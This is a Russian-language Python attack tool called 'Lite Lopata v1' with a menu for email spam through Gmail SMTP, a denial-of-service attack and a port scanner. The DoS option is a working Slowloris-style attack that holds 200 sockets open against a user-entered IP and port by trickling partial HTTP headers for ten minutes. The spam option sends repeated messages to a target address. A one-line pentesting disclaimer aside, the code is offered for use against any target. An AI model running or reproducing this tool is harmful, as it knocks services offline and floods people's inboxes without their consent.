import os
import time
import smtplib
import requests
from termcolor import colored
from threading import Thread
import socket, random, time, sys
from colorama import init
from colorama import Fore, Back, Style

class Brandon():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Отправка пакета #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


init()

print( Fore.RED )

print("Скрипт создан для пинтестинга, использование его во зло несёт ответственность!")

print( Fore.GREEN )

print ("Добро пожаловать в скрипт Lite Lopata v1")
print ("1. Спам на почту ")
print ("2. Ддос ")
print ("3. Сканер портов ")

a = input("Что желаешь выбрать? ")

if a == '1':
    smtpObj = smtplib.SMTP('smtp.gmail.com',587)
    smtpObj.starttls()
    gml = input("gmail: ")
    ps = input("password: ")
    if smtpObj.login(gml,ps):
        jar = input("e-mail_attack:")
        mess = input("message: ")
        smtpObj.sendmail(gml,jar,mess)
        i = 1
        while i <= 5:
            if smtpObj.sendmail(gml,jar,mess):
                print( Fore.RED )          
                print('message send - [ERROR]')
            else:
                print('message send - [OK]')
                i = i + 1
    else:
        print( Fore.RED )
        print("no valid password")

if a == '2':
        ipss = input("Введите IP: ")
        port666 = int(input("Введите порт: "))
        if __name__ == "__main__":  
            dos = Brandon(ipss, port666, socketsCount=200)
            dos.attack(timeout=60*10)
    
if a == '3':
    print("Пошёл процесс!")
mas = [20, 21, 22, 23, 25, 42, 43, 53, 67, 69, 80, 110, 115, 123, 137, 138, 139, 143, 161, 179, 443, 445, 514, 515, 993, 995, 1080, 1194, 1433, 1702, 1723, 3128, 3268, 3306, 3389, 5432, 5060, 5900, 5938, 8080, 10000, 20000]
print ("Простейший сканер")
print (" ")
host = input('Введите имя сайта или IP адрес: ')
print ("--------------------------------")
print ("Ожидайте идёт сканирование портов!")
print ("--------------------------------")
for port in mas:
    s = socket.socket()
    s.settimeout(1)
    try:
        s.connect((host, port))
    except socket.error:
        pass
    else:
        s.close
        print (host + ': ' + str(port) + ' порт активен')
print ("--------------------------------")
print ("Процесс завершен")
